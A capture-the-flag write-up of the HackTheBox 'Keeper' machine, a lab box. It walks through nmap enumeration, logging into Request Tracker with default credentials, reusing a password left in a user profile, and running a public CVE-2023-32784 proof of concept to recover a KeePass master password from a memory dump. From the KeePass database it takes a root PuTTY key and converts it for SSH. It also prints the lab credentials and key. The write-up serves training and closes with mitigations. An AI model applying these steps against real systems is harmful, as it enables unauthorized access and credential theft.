---
title: "HackTheBox - Keeper"
author: Nasrallah
description: ""
date: 2024-02-11 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, keepass, putty, ssh, cve]
img_path: /assets/img/hackthebox/machines/keeper
image:
    path: keeper.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description**

[Keeper](https://www.hackthebox.com/machines/keeper) from [HackTheBox](https://www.hackthebox.com) is an easy box running a web application with default credentials where we find a password in one of the user's profile giving us a foothold. On the system we find keepass dump file where we are able to get a password from it because of a vulnerability, and with that we get an ssh key for root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.70.234 (10.129.70.234)
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
|_  256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There is OpenSSH running on port 22 and Nginx http web server on port 80, and box is Ubuntu.

### Web

Let's navigate to the web page.

![1](1.png)

We find a link that goes to `tickets.keeper.htb`, let's add the two domains to `/etc/hosts` and go to `ticket` page.

![2](2.png)

The website is `Request Tracker` from `PracticalSolutions`.

Searching the internet for default credentials i found the following:

![3](3.png)

Let's login with `root:password`

![4](4.png)

We logged in successfully.

## **Foothold**

Let's explore this application.

![5](5.png)

On the `rt/Admin/Users/` page we find there is a user called `lnorgaard`. Let's click on the username.

![6](6.png)

On this page we found a password.

Let's try ssh to the target as `lnorgaard:Welcome2023!`

![7](7.png)

Great!

## **Privilege Escalation**

On the user's directory we find a zip file.

```terminal
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

Let's transfer the file to our machine using `scp`

```bash
scp lnorgaard@keeper.htb:./RT30000.zip .
```

### Zip

After unzipping the file, we got two file `KeePassDumpFull.dmp` and `passcodes.kdbx`.

The `passcodes.kdbx` is a keepass file that's probably holding the root password.

The `KeePassDumpFull.dmp` is a dump file.

Searching for `keepass dump file` reveals the `CVE-2023-32784` where we're able to dump the master password from `keepass`'s memory.

We can find an exploit here [https://github.com/CMEPW/keepass-dump-masterkey](https://github.com/CMEPW/keepass-dump-masterkey).

```bash
$ python poc.py -d /tmp/keeper/KeePassDumpFull.dmp  
2023-08-18 11:26:07,651 [.] [main] Opened /tmp/keeper/KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

The exploit gave up multiple possible password that looks the same, let's copy one of those and search it on Google so that it would correct us thus giving the right password.

![8](8.png)

We got the correct word! `rødgrød med fløde`.

Let's access the keepass file.

```bash
$ pipx run kpsh passcodes.kdbx
passcodes.kdbx> unlock
Database password: *****************
passcodes.kdbx> show 'Network/keeper.htb (Ticketing Server)'
path: Network/keeper.htb (Ticketing Server)
username: root
password: F4><3K0nd!
notes[1]: PuTTY-User-Key-File-3: ssh-rsa
notes[2]: Encryption: none
notes[3]: Comment: rsa-key-20230519
notes[4]: Public-Lines: 6
notes[5]: AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
notes[6]: 8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
notes[7]: EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
notes[8]: Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
notes[9]: FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
notes[10]: LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
notes[11]: Private-Lines: 14
notes[12]: AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
notes[13]: oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
notes[14]: kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
notes[15]: f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
notes[16]: VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
notes[17]: UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
notes[18]: OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
notes[19]: in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
notes[20]: SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
notes[21]: 09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
notes[22]: xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
notes[23]: AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
notes[24]: AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
notes[25]: NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
notes[26]: Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

We found a putty private key that belongs to `root`.

Let's copy the notes to a file and clean it using the following command:

```bash
cut -d " " -f 2,3 priv.key | tee putty.key
```

With the help of `puttygen`, we can convert this key to an `id_rsa` that will allow us to connect as root.

```bash
puttygen putty.key -O private-openssh -o id_rsa
```

Now we connect as root using `id_rsa`

![9](9.png)

We got root!

## **Prevention and Mitigation**

### Default password

Most programs that require authentication comes with default credentials that are easy to guess so it is necessary to change the default password to a more long and complex one.

### Plain text password

Were were able to find a clear text password for a user on the web application. Password should not be laying around like that, and if it's necessary then the users must be forced to change the password after their first login.

### CVE-2023-32784

When using third party software it is necessary to keep up with it's updates, especially the security related ones.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
